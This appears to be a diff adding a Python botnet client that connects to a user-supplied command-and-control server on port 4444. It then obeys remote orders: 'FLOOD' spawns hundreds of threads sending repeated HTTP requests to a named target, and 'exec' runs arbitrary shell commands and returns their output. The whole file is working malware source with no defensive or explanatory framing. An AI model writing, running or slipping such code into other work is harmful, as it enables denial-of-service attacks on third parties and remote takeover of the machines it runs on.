@@ -1,0 +1,48 @@
+import socket
+import threading
+import subprocess
+import os
+import time
+import random
+import requests
+
+c2_server = input("C2 IP: ")
+c2_port = 4444
+
+def flood(target):
+    while True:
+        try:
+            requests.get(f"http://{target}", timeout=1)
+            requests.post(f"http://{target}", data={'x':'y'*10000}, timeout=1)
+        except:
+            pass
+
+def execute_cmd(cmd):
+    return subprocess.getoutput(cmd)
+
+def connect_c2():
+    while True:
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            s.connect((c2_server, c2_port))
+            s.send(f"Bot {os.getpid()} ready".encode())
+            while True:
+                cmd = s.recv(1024).decode()
+                if cmd.startswith("FLOOD"):
+                    target_ip = cmd.split()[1]
+                    for _ in range(500):
+                        threading.Thread(target=flood, args=(target_ip,), daemon=True).start()
+                    s.send(f"Flooding {target_ip}".encode())
+                elif cmd.startswith("exec"):
+                    result = execute_cmd(cmd[5:])
+                    s.send(result.encode()[:1024])
+                else:
+                    s.send(b"Unknown command")
+        except:
+            time.sleep(5)
+
+for _ in range(100):
+    threading.Thread(target=connect_c2, daemon=True).start()
+
+while True:
+    time.sleep(999999)
